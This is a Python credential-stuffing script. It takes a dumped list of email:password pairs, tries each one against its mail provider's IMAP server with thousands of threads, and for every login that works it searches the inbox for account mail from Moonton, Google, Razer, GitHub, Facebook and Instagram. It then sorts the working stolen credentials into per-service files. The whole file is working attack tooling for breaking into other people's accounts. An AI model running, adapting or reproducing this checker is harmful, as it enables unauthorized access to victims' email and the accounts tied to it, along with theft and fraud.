from imaplib import IMAP4_SSL as ssl_imap
from imaplib import IMAP4 as imap
from ltp import printf
import re, os, requests as req, ltp, socket
import itertools
from sys import stdout
socket.setdefaulttimeout(3)
# os.system("rm -rf valid.c")
# dumpz=input("file: ")
def chunker(n, iterable):
    it = iter(iterable)
    while True:
        chunk = tuple(itertools.islice(it, n))
        if not chunk:
            return
        yield chunk

def check(xx):
    global dump
    xx=dump[xx]
    if "@gmail" in xx or "@t-online" in xx or "@yahoo" in xx or "@google" in xx or "@hotmail" in xx or "@yandex" in xx or "@mail" in xx:
        return
    # if xx in str(ltp.get("live.c")):
        # return
    try:
        split=xx.split(":")
        email=split[0]
        host=email.split("@")[1]
        pwd=split[1]
        x=email
    except:
        return
    for kaMsbd in range(0, 3):
        try:
            mail=ssl_imap("imap."+host)
            mail.login(email, pwd)
            mail.select('INBOX')
            
            moonton = mail.search(None, 'FROM "donotreply@register-sc.moonton.com"')
            google = mail.search(None, 'FROM "no-reply@accounts.google.com"')
            gold = mail.search(None, 'FROM "gold.noreply@razer.com"')
            razer = mail.search(None, 'FROM "no.reply@razer.com"')
            github = mail.search(None, 'FROM "noreply@github.com"')
            facebook = mail.search(None, 'FROM "security@facebookmail.com"')
            insta = mail.search(None, 'FROM "no-reply@mail.instagram.com"')
            ang=0
            ltp.app("live.c", xx)
            if moonton[1][0].decode()!="":
                ang=ang+1
                stdout.write("\rMOONTON -> "+x+"\n")
                ltp.app("moonton.c", xx)
            if google[1][0].decode()!="":
                ang=ang+1
                stdout.write("\rGOOGLE -> "+x+"\n")
                ltp.app("google.c", xx)
            if gold[1][0].decode()!="":
                ang=ang+1
                stdout.write("\rGOLD -> "+x+"\n")
                ltp.app("gold.c", xx)
            if razer[1][0].decode()!="":
                ang=ang+1
                stdout.write("\rRAZER -> "+x+"\n")
                ltp.app("razer.c", xx)
            if github[1][0].decode()!="":
                ang=ang+1
                stdout.write("\rGITHUB -> "+x+"\n")
                ltp.app("github.c", xx)
            if facebook[1][0].decode()!="":
                ang=ang+1
                stdout.write("\rFACEBOOK -> "+x+"\n")
                ltp.app("facebook.c", xx)
            if insta[1][0].decode()!="":
                ang=ang+1
                stdout.write("\rINSTA -> "+x+"\n")
                ltp.app("insta.c", xx)
            if ang==0:
                stdout.write("\rLIVE -> "+x+"\n")
                ltp.app("valid.c", xx)
            return
        except Exception as e:
            # print(e)
            # # printf("DEAD -> "+x)
            # return
            if 'Invalid login or password' in str(e) or "failed" in str(e) or "Failed" in str(e) or "fail" in str(e) or "username or password" in str(e) or "No address associated with hostname" in str(e) or "invalid" in str(e):
                printf("DEAD -> "+x)
                return
            elif "timed out" in str(e):
                pass
            else:
                printf("DEAD -> "+x)
                return

# with ltp.exe(10) as exe:
    # for x in range(0,100):
        # exe.submit(check,x)
file="dump.txt"
dump=ltp.get(file)
chunks = list(range(0, len(dump)))
for chunk in chunker(20000, chunks):
    # stdout.write(chunk[0])
    with ltp.exe(4000) as exe:#200
        exe.map(check, chunk)
        exe.shutdown(wait=True)
        del exe, chunk
        stdout.flush()
del dump, chunks, file



"""
(?!^.*.*:.*[A-Z].*\n.*$)^.+\n?
(?!^.*.*:.*[a-z].*\n.*$)^.+\n?
(?!^.*.*:.*\d.*\n.*$)^.+\n?
"""
    







